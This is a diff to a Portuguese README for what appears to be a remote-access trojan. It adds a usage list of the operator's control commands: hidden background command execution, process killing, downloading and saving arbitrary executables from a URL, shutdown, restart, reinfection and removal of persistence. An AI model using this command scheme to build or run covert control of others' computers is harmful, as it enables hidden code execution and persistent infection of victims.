@@ -13,3 +13,25 @@ O front end esta com bastantes bugs, eu n trabalhei muito no backend pois sua un
   <img width="100%" src="https://i.imgur.com/TpqS0Cu.png">
 </p>
 
+
+
+<p align="left">
+  Comandos:
+          Upload de arquivo
+          Matar processo
+          Desligar
+          Reiniciar
+          Execuçao de comandos
+          Remover persistencia
+          Reinfectar
+  Prefixos:
+          exec!oculto+comando = Executa comandos em background
+          exec!comando = Executa o comando sem ser em background
+          KILL!nomedoprocesso = mata o processo
+          DOWNLOAD!http://link/arquivo.exe?nomequequersalvar.exe = baixa arquivo
+          REINFECT = reinfecta a maquina
+          SHUTDOWN = Desliga o cumputador
+          RESTART = Reinicia o computador
+          Unistall = Remove persistencia
+</p>
+
